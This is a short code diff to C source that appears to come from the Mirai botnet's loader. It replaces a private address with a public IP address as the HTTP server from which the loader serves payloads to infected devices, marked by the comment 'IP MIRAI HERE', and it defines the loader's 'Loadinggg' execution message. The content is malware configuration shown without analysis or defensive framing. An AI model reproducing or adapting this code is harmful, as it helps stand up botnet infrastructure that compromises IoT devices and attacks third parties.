@@ -5,7 +5,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
-#define HTTP_SERVER utils_inet_addr(192,168,1,22) //IP MIRAI HERE
+#define HTTP_SERVER utils_inet_addr(18,210,115,110) //IP MIRAI HERE
 
 #define EXEC_MSG            "Loadinggg\n"
 #define EXEC_MSG_LEN        10
